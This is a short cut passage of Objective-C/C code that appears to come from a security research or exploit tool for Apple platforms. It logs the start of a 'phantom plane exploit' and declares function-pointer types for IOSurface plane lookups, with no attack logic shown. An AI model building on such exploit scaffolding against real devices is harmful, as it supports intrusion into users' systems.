            }

            log(@"PHANTOM: Starting phantom plane exploit");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            typedef size_t (*ISR_PlaneCountFn)(IOSurfaceRef);
            typedef void * (*ISR_PlaneBaseFn)(IOSurfaceRef, size_t);
